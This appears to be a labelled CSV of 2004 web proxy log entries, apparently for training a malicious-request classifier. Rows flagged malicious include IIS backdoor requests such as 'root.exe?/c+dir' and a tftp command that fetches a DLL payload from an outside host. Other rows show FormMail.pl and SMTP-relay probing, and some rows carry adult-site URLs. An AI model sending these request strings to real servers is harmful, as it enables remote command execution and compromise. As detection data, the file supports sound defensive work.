,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
9492,68.82.168.149,10/Mar/2004:13:23:41 -0500,http://www.sexyvictoria.com/members/main/index.html ,200,566,"""http://www.sexyvictoria.com/members/main/index.html""",Mozilla/5.0 ( compatible; [de]; Windows NT4.0; DigiExt ),n,0,/members/main/index.html,0,without browser
9493,195.16.40.200,10/Mar/2004:13:23:46 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9494,203.121.182.188,10/Mar/2004:13:23:46 -0500,210.242.13.10:25 ,200,0,"""-""",-,n,0,210.242.13.10:25,0,without browser
9495,218.29.56.234,10/Mar/2004:13:23:51 -0500,http://www.owlsearch.net/cgi-bin/sf.cgi?t=o6&keys=zczdzszyzkhhskhndfscfsxzckssayskasdvdmfhsmszfssdafahschcfyzofyakddfvdffxsscmzysfsxdzfnfohnacszfnssfscahssmzzscsnsxshazfxsasffszmzoaosvapsyzyhnfpdpdhfnahzczvaodofsamdzsidzaifcaaddzszkaidysaskamapdhfcspdhaixkhfahaifkdpfxfzfhzohshaaohchiayahayadsisxhadsssfisdzihnapfzzczozvaihzsvsyskfncdxisxazaodadfhihzazhdsnfxxyxazsshsksxanfyhdashffksxxfziazahscanfvhnhadfaffyzaaxhpavdpdyfksnshdsdyazfdsazozxaozdfidhdvshaxsxdadoffzazyzddoaazmfmfcdfaodffmzaxzxvaidpfyfpfxhmhhdiamfcfszaaididxzxzpfyaaspdpshfvdhcicofsscaddsfnfoasamszhxdhafzassfnzcfisvdfshzkhsaiszxxzmdzffshfvahavsfzdhdaxzyhxsxsvafschsadaozismsizmsssnsxzvadaaavsnhhanamspzdaczhhfsmssaksxzsdvdxhnhdhfzssvanzksassaa&kw=relocation ,300,578,"""http://www.owlsearch.net/cgi-bin/smartsearch.cgi?username=luckmos&keywords=Relocation""",Mozilla/4.0 (compatible; MSIE 5.5; AOL 8.0; Windows 98; Win 9x 4.90),n,0,/cgi-bin/sf.cgi,3,Microsoft Internet Explorer
9496,218.29.56.234,10/Mar/2004:13:23:53 -0500,http://c.ah-ha.com/c?e1=pduJfETpCgl20qMgE0Kfv5R2srdRHAriFRXRYtQxlE41TB4sCPlO43MGLWbDF1ACpFAI5tZ0tsEKFlizQXM3abwdSiNDzhCVWwe01WcY00GscrtqHjX0a2Trlkh3LKJz1w54BBxqgGQKxzj5g430GvcxfVoA0bdzvrygdz423QYMQKysmLyCuKGescjBbstPgQoHqVrIZannrZJQX02dylaryCtpLhzmic4kkSCrWmj0CIOjdtYcOCJEiE3L&h=5fRshQFQakbfSFCpC&b=31635 ,300,0,"""-""",Mozilla/4.0 (compatible; MSIE 5.5; AOL 8.0; Windows 98; Win 9x 4.90),n,0,/c,3,Microsoft Internet Explorer
9497,195.16.40.200,10/Mar/2004:13:23:54 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9498,195.16.40.200,10/Mar/2004:13:23:56 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9499,218.29.56.234,10/Mar/2004:13:23:59 -0500,http://c.ah-ha.com/c/2?e1=pduJfETpCgl20qMgE0Kfv5R2srdRHAriFRXRYtQxlE41TB4sCPlO43MGLWbDF1ACpFAI5tZ0tsEKFlizQXM3abwdSiNDzhCVWwe01WcY00GscrtqHjX0a2Trlkh3LKJz1w54BBxqgGQKxzj5g430GvcxfVoA0bdzvrygdz423QYMQKysmLyCuKGescjBbstPgQoHqVrIZannrZJQX02dylaryCtpLhzmic4kkSCrWmj0CIOjdtYcOCJEiE3L&h=5fRshQFQakbfSFCpC&b=31635 ,300,0,"""-""",Mozilla/4.0 (compatible; MSIE 5.5; AOL 8.0; Windows 98; Win 9x 4.90),n,0,/c/2,3,Microsoft Internet Explorer
9500,195.16.40.200,10/Mar/2004:13:24:01 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9501,68.82.168.149,10/Mar/2004:13:24:03 -0500,http://www.sexyvictoria.com/members/main/index.html ,200,566,"""http://www.sexyvictoria.com/members/main/index.html""",Mozilla/5.0 ( compatible; MSIE 5.5; Windows NT4.0; MSNIA ),n,0,/members/main/index.html,0,Microsoft Internet Explorer
9502,195.16.40.200,10/Mar/2004:13:24:05 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9503,67.83.151.132,10/Mar/2004:13:24:10 -0500,http://www.canoesports.co.nz/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
9504,195.16.40.200,10/Mar/2004:13:24:13 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9505,195.16.40.200,10/Mar/2004:13:24:20 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9506,195.16.40.200,10/Mar/2004:13:24:20 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9507,67.83.151.132,10/Mar/2004:13:24:22 -0500,http://www.kinopolis.de/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
9508,195.16.40.200,10/Mar/2004:13:24:25 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9509,61.172.244.232,10/Mar/2004:13:24:30 -0500,209.15.20.28:25 ,200,0,"""-""",-,n,0,209.15.20.28:25,0,without browser
9510,195.16.40.200,10/Mar/2004:13:24:30 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9511,218.29.56.234,10/Mar/2004:13:24:35 -0500,http://www.owlsearch.net/cgi-bin/sf.cgi?t=o4&keys=ffzdhdscdvdnspscfidyfxxacyfvandndvfohvdmsvfdskfpcscmshdossdpavdydddysihsdpcmxfasspdydysihvasfzadhcdnxzavffaksisksxfasvsyanazdycpxodmdfsydzdasffsfmfmaisacicozddksydnayfoamdmdzscsncohfzffzavasdzdpfizkdhdsdxhozyfasfaianzofihsdxfvfodmcccsdzdpaoszdxfhasfmsofazvcyhndsdadyskdasmdddxfphzsnzvakdpdpdfzodffdfsafaddxdaafhasmsfamfndxfoavfofvfssphkzvdzsxaodzdvhohzdcsisosvcyzxshdodoaaaifoavdxsphzdphczdfasvdpahzhhnfvzkdsdzssxycofsdxdpfosxdfhasphffffscfzhdpapaaszdsdffzfyfyfizhhyckscdasadcdzdmacsyahdfzdckamfzdpdpadzodpfmdmsafkakzachzddcfhdyfnavsmaidaffdockxvaodmddscdaszhszifpddfxzpczavdhfzdcsxsdddsiskhadncozaazspdidpfpdvfsfosvdasfcfcodndpdssmszfsdhsxanahdyhfxpdpfhsxfososvspszsifpshaccyszdvsiaazkdydhaaskskzfcpxvdifhdyfodsaffxzyfxdassakxpdzdofhzihndfhdfxshhizfcmzsfafzanavsvfffoacdnhxfvzkzpffsszcdmfnscdcfidcsmaxhdcfdyfxzfziafsmfzdhfkafzvxdzxspfxdofkacdpfcfzdhdxfaxozhfzzddoazszfidazmfifffpzyczfffpaozpfofphazpdffxzfhyzfdfzhsksvfxhnavfyfshcdkcsxfhkzzszskafhohnashaaxzxahavsdakzkskznhvsyzphzhfzfafayzszzzazozzhkskzdsssfafhdskafafssavadansdsxassszohczoaaapapsishzkhszyhdhnsahazkziadsdaohdhpzkzchszmzdadaphozdzhzyhdhkhszizozpzpzzzyazshzmsxansszxanssaysnhxzsspzofxfnhmhkhfzkzihhzohchkai&kw=relocation ,300,835,"""http://www.owlsearch.net/cgi-bin/smartsearch.cgi?username=luckmos&keywords=Relocation""",Mozilla/4.0 (compatible; MSIE 5.5; AOL 8.0; Windows 98; Win 9x 4.90),n,0,/cgi-bin/sf.cgi,3,Microsoft Internet Explorer
9512,195.16.40.200,10/Mar/2004:13:24:35 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9513,203.121.182.144,10/Mar/2004:13:24:37 -0500,207.137.186.77:25 ,500,434,"""-""",-,n,0,207.137.186.77:25,0,without browser
9514,218.29.56.234,10/Mar/2004:13:24:38 -0500,http://216.133.243.28/2.php?sid=111&keyword=relocation&goto=b693743752764a15c8ac127e3a95bce4-MTA3ODk0Mjk5Nwk2OC40OC4xMDYuMTA5CQlwX3JzMDEJMTExCXJlbG9jYXRpb24JYWgtaGEJaHR0cDovL2MuYWgtaGEuY29tL2M%2FZTE9cGR1SmZFVHBDZ2xybGJ3bmVjT1hBamxncFdHVEhBcmlGUlhSWXRReGxFNDJQWmtvWU4yeExmUERwYzJIU21yYkRXaDVZTFowdHNFS0ZsaXpRWE0zYWJ3V3JjdjFVUjNhSk5VZDRMZmtwVzRCT0g0MmFYTFRKcDE0U08xYlExdW1uVkRnbXZibUluaU55QWxjTnlmRXFkRWIzekl5NEdyNXB3QWV6ak1UVEpYcVNPcU9QbHdZWmxWTUNXUXV1Q0sweEtmTHJ0ZEVabG1mWkpIRmRoSlA0RXdlVHNwYWlOUHZBdmduVmcmaD1FU3dMd1dNVmpMYW5aNEJqQiZiPTMxNjM1CTAuMTIJMAkxCQk%3D ,200,1088,"""-""",Mozilla/4.0 (compatible; MSIE 5.5; AOL 8.0; Windows 98; Win 9x 4.90),m,1,/2.php,3,Microsoft Internet Explorer
9515,195.16.40.200,10/Mar/2004:13:24:40 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9516,67.83.151.132,10/Mar/2004:13:24:42 -0500,http://www.hella.co.nz/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
9517,195.16.40.200,10/Mar/2004:13:24:48 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9518,195.16.40.200,10/Mar/2004:13:24:55 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9519,195.16.40.200,10/Mar/2004:13:24:56 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9520,68.48.7.157,10/Mar/2004:13:24:57 -0500,/scripts/root.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/root.exe,0,without browser
9521,218.29.56.234,10/Mar/2004:13:24:57 -0500,http://216.133.243.28/3.php/?time=1078943077&check=716388ca96e4ab281b7474e5478f8ba4&sid=111&goto=b693743752764a15c8ac127e3a95bce4-MTA3ODk0Mjk5Nwk2OC40OC4xMDYuMTA5CQlwX3JzMDEJMTExCXJlbG9jYXRpb24JYWgtaGEJaHR0cDovL2MuYWgtaGEuY29tL2M/ZTE9cGR1SmZFVHBDZ2xybGJ3bmVjT1hBamxncFdHVEhBcmlGUlhSWXRReGxFNDJQWmtvWU4yeExmUERwYzJIU21yYkRXaDVZTFowdHNFS0ZsaXpRWE0zYWJ3V3JjdjFVUjNhSk5VZDRMZmtwVzRCT0g0MmFYTFRKcDE0U08xYlExdW1uVkRnbXZibUluaU55QWxjTnlmRXFkRWIzekl5NEdyNXB3QWV6ak1UVEpYcVNPcU9QbHdZWmxWTUNXUXV1Q0sweEtmTHJ0ZEVabG1mWkpIRmRoSlA0RXdlVHNwYWlOUHZBdmduVmcmaD1FU3dMd1dNVmpMYW5aNEJqQiZiPTMxNjM1CTAuMTIJMAkxCQk= ,400,960,"""-""",Mozilla/4.0 (compatible; MSIE 5.5; AOL 8.0; Windows 98; Win 9x 4.90),n,0,/3.php/,4,Microsoft Internet Explorer
9522,195.16.40.200,10/Mar/2004:13:25:01 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9523,81.224.69.47,10/Mar/2004:13:25:03 -0500,http://81.224.69.47/members/sex/fuck/id000008id/lund896lundxxx.html ,500,599,"""-""",-,n,0,/members/sex/fuck/id000008id/lund896lundxxx.html,0,without browser
9524,81.224.69.47,10/Mar/2004:13:25:03 -0500,81.224.69.47:80 ,500,432,"""-""",-,n,0,81.224.69.47:80,0,without browser
9525,195.16.40.200,10/Mar/2004:13:25:10 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9526,68.82.168.149,10/Mar/2004:13:25:11 -0500,http://www.sexyvictoria.com/members/main/index.html ,200,566,"""http://www.sexyvictoria.com/members/main/index.html""",Mozilla/4.0 ( compatible; MSIE 5.01; Windows XP; DigiExt ),n,0,/members/main/index.html,0,Microsoft Internet Explorer
9527,195.16.40.200,10/Mar/2004:13:25:11 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9528,195.243.48.186,10/Mar/2004:13:25:12 -0500,http://amateur-facials.com/1850/20202/index.html ,200,0,"""http://amateur-facials.com/1850/20202/index.html""",Mozilla/4.7 ( compatible; MSIE 4.01; Windows NT5.0; NetCaptor ),n,0,/1850/20202/index.html,0,Microsoft Internet Explorer
9529,195.243.48.186,10/Mar/2004:13:25:12 -0500,http://amateur-facials.com/1850/20202/index.html ,200,0,"""http://amateur-facials.com/1850/20202/index.html""",Mozilla/5.0 ( compatible; [en]; Windows NT4.0; DigiExt ),n,0,/1850/20202/index.html,0,without browser
9530,195.16.40.200,10/Mar/2004:13:25:15 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9531,81.241.189.48,10/Mar/2004:13:25:25 -0500,http://www.glocksoft.net/cgi-bin/jenv.cgi ,200,1169,"""-""",Mozilla/4.0,n,0,/cgi-bin/jenv.cgi,0,without browser
9532,195.16.40.200,10/Mar/2004:13:25:25 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9533,195.16.40.200,10/Mar/2004:13:25:25 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9534,195.16.40.200,10/Mar/2004:13:25:29 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9535,67.83.151.132,10/Mar/2004:13:25:35 -0500,http://home.joice.net/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
9536,195.16.40.200,10/Mar/2004:13:25:38 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9537,195.16.40.200,10/Mar/2004:13:25:42 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9538,195.16.40.200,10/Mar/2004:13:25:45 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9539,67.83.151.132,10/Mar/2004:13:25:46 -0500,http://www.martinsgiftworld.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
9540,68.48.7.157,10/Mar/2004:13:25:48 -0500,/scripts/root.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/root.exe,0,without browser
9541,195.16.40.200,10/Mar/2004:13:25:49 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9542,68.48.7.157,10/Mar/2004:13:25:49 -0500,/scripts/httpodbc.dll ,400,288,"""-""",-,m,1,/scripts/httpodbc.dll,0,without browser
9543,195.16.40.200,10/Mar/2004:13:25:54 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9544,68.82.168.149,10/Mar/2004:13:26:01 -0500,http://www.sexyvictoria.com/members/main/index.html ,200,566,"""http://www.sexyvictoria.com/members/main/index.html""",Mozilla/4.0 ( compatible; MSIE 5.01; Windows XP; DigiExt ),n,0,/members/main/index.html,0,Microsoft Internet Explorer
9545,195.16.40.200,10/Mar/2004:13:26:04 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9546,61.237.215.17,10/Mar/2004:13:26:07 -0500,http://hellynet.com/search.php?ID=1093&fString=Lifestyle ,300,0,"""http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/search.php,2,Microsoft Internet Explorer
9547,195.16.40.200,10/Mar/2004:13:26:07 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9548,61.237.215.17,10/Mar/2004:13:26:07 -0500,http://hellynet.com/search_results.php?fSearch_id=d4cd69dfcdedab37&fString=lifestyle ,200,11069,"""http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/search_results.php,2,Microsoft Internet Explorer
9549,195.16.40.200,10/Mar/2004:13:26:09 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9550,203.121.182.140,10/Mar/2004:13:26:10 -0500,211.195.113.200:25 ,500,438,"""-""",-,n,0,211.195.113.200:25,0,without browser
9551,61.237.215.17,10/Mar/2004:13:26:10 -0500,http://hellynet.com/redirect.php?fID=36354415 ,300,0,"""http://hellynet.com/search_results.php?fSearch_id=d4cd69dfcdedab37&fString=lifestyle""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/redirect.php,1,Microsoft Internet Explorer
9552,61.237.215.17,10/Mar/2004:13:26:12 -0500,http://www.abcsearch.com/redirect/?affiliate=hellynet&Terms=lifestyle&b=%200.08&abctime=1078943164&id=441&hash=4876cf60aba3c68ab1fcde84f54eceae ,200,321,"""http://hellynet.com/search_results.php?fSearch_id=d4cd69dfcdedab37&fString=lifestyle""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/redirect/,6,Microsoft Internet Explorer
9553,61.237.215.17,10/Mar/2004:13:26:12 -0500,http://www.abcsearch.com/jump/?affiliate=hellynet&send=1&Terms=lifestyle&url=aHR0cDovL3NlcnZpY2UuYmZhc3QuY29tL2JmYXN0L2NsaWNrP2JmbWlkPTI3MzU5NzQzJnNpdGVp%0AZD0zOTY4NTg5MyZiZnBhZ2U9eWVsbG93%0A&ref=uggc%3A%2F%2Furyylarg.pbz%2Ffrnepu_erfhygf.cuc&b=%200.08&id=441&abctime=1078943164 ,200,566,"""http://www.abcsearch.com/redirect/?affiliate=hellynet&Terms=lifestyle&b=%200.08&abctime=1078943164&id=441&hash=4876cf60aba3c68ab1fcde84f54eceae""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),m,1,/jump/,8,Microsoft Internet Explorer
9554,195.16.40.200,10/Mar/2004:13:26:14 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9555,195.16.40.200,10/Mar/2004:13:26:19 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9556,67.83.151.132,10/Mar/2004:13:26:22 -0500,http://www.factoryskatepark.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
9557,195.16.40.200,10/Mar/2004:13:26:24 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9558,195.16.40.200,10/Mar/2004:13:26:28 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9559,68.82.168.149,10/Mar/2004:13:26:29 -0500,http://www.sexyvictoria.com/members/main/index.html ,200,566,"""http://www.sexyvictoria.com/members/main/index.html""",Mozilla/4.0 ( compatible; MSIE 5.01; Windows XP; DigiExt ),n,0,/members/main/index.html,0,Microsoft Internet Explorer
9560,195.16.40.200,10/Mar/2004:13:26:33 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9561,67.83.151.132,10/Mar/2004:13:26:33 -0500,http://www.norr.worldnet.se/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
9562,195.16.40.200,10/Mar/2004:13:26:38 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9563,68.48.7.157,10/Mar/2004:13:26:41 -0500,/MSADC/root.exe?/c+dir ,200,566,"""-""",-,m,1,/MSADC/root.exe,0,without browser
9564,217.136.207.149,10/Mar/2004:13:26:41 -0500,http://havenxxx.com/members/home/index.html ,200,566,"""http://havenxxx.com:80""",Mozilla/4.0 ( compatible; [en]; Windows XP; DigiExt ),n,0,/members/home/index.html,0,without browser
9565,195.16.40.200,10/Mar/2004:13:26:48 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9566,195.16.40.200,10/Mar/2004:13:26:51 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9567,68.82.168.149,10/Mar/2004:13:26:53 -0500,http://www.sexyvictoria.com/members/main/index.html ,200,566,"""http://www.sexyvictoria.com/members/main/index.html""",Mozilla/3.01 ( compatible; [en]; Windows 98; NetCaptor ),n,0,/members/main/index.html,0,without browser
9568,195.16.40.200,10/Mar/2004:13:26:58 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9569,195.16.40.200,10/Mar/2004:13:26:59 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9570,195.16.40.200,10/Mar/2004:13:27:04 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9571,67.83.151.132,10/Mar/2004:13:27:05 -0500,http://www.lebonbolli.co.nz/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
9572,68.82.168.149,10/Mar/2004:13:27:06 -0500,http://www.sexyvictoria.com/members/main/index.html ,200,566,"""http://www.sexyvictoria.com/members/main/index.html""",Mozilla/4.6 ( compatible; [de]; Windows 98; DigiExt ),n,0,/members/main/index.html,0,without browser
9573,195.16.40.200,10/Mar/2004:13:27:09 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9574,68.82.168.149,10/Mar/2004:13:27:09 -0500,http://www.sexyvictoria.com/members/main/index.html ,200,566,"""http://www.sexyvictoria.com/members/main/index.html""",Mozilla/4.6 ( compatible; [de]; Windows NT4.0; DigiExt ),n,0,/members/main/index.html,0,without browser
9575,195.16.40.200,10/Mar/2004:13:27:16 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9576,218.23.87.71,10/Mar/2004:13:27:16 -0500,http://www.boopin.com/s.php?username=ah7401&keywords=Adventure ,200,9040,"""http://www.boopin.com/s.php?username=ah7401""",Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),n,0,/s.php,2,Microsoft Internet Explorer
9577,195.16.40.200,10/Mar/2004:13:27:18 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9578,218.23.87.71,10/Mar/2004:13:27:19 -0500,http://www.boopin.com/other.php?k=hphahahzhazmhmhnhphazfzshszcadspayhaacsdsvaiazapahscfphmazsmasskhpzchvszszanhddxamazhosvdkzcshzkaosasxszsdazznavspafacsxscakamsmhpshsaskscapsxsasodvhvakzxznzxhvasahsahmsdzzsdaisihvaiacaxsfshzxshavazszanhcsdaisihnakszaahhamsmayaysyznsmaaayzxhdzosxsascsk&u=xuppa&a=ah7401&keywords=adventure&gen=&gto=zyzhhchhhhzfzohyzizc ,300,0,"""http://www.boopin.com/s.php?username=ah7401&keywords=Adventure""",Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),n,0,/other.php,5,Microsoft Internet Explorer
9579,218.23.87.71,10/Mar/2004:13:27:20 -0500,http://www.xuppa.com/cgi-local/click.cgi?o=roy123&k=Adventure&partnerid=boopin&c=_b9pt_&pro=1&srch=Adventure&pos=1 ,300,430,"""http://www.boopin.com/s.php?username=ah7401&keywords=Adventure""",Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),n,0,/cgi-local/click.cgi,7,Microsoft Internet Explorer
9580,218.23.87.71,10/Mar/2004:13:27:22 -0500,http://msxml.us.info.com/infocom.us/results?otmpl=dog%2Fwebresults.htm&ran=7495&qk=10&top=1&qkw=Adventure&qcat=web&qo=us&CMP=KNC-VI9397575996&infoad=1 ,200,15182,"""http://www.boopin.com/s.php?username=ah7401&keywords=Adventure""",Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),n,0,/infocom.us/results,9,Microsoft Internet Explorer
9581,67.83.151.132,10/Mar/2004:13:27:27 -0500,http://www.coastside.net/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
9582,195.16.40.200,10/Mar/2004:13:27:30 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9583,200.119.99.120,10/Mar/2004:13:27:31 -0500,http://www.helllabs.com.ua/cgi-bin/textenv.pl?80 ,500,538,"""-""",Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0),n,0,/cgi-bin/textenv.pl,0,Microsoft Internet Explorer
9584,195.16.40.200,10/Mar/2004:13:27:31 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9585,68.48.7.157,10/Mar/2004:13:27:32 -0500,/MSADC/root.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20httpodbc.dll ,200,566,"""-""",-,m,1,/MSADC/root.exe,0,without browser
9586,68.48.7.157,10/Mar/2004:13:27:33 -0500,/MSADC/httpodbc.dll ,400,286,"""-""",-,m,1,/MSADC/httpodbc.dll,0,without browser
9587,195.16.40.200,10/Mar/2004:13:27:34 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9588,195.16.40.200,10/Mar/2004:13:27:39 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
9589,61.171.134.216,10/Mar/2004:13:27:46 -0500,http://service.bfast.com/bfast/serve?bfmid=37920209&siteid=40922485&bfpage=general__120x60 ,200,43,"""http://www.affiliatesbefree.thefreeserver.com/""",Mozilla/4.0 (compatible; MSIE 4.0; Windows 98),n,0,/bfast/serve,3,Microsoft Internet Explorer
9590,61.171.134.216,10/Mar/2004:13:27:47 -0500,http://adfarm.mediaplex.com/ad/bn/711-1751-4022-16 ,300,0,"""http://www.affiliatesbefree.thefreeserver.com/""",Mozilla/4.0 (compatible; MSIE 4.0; Windows 98),n,0,/ad/bn/711-1751-4022-16,0,Microsoft Internet Explorer
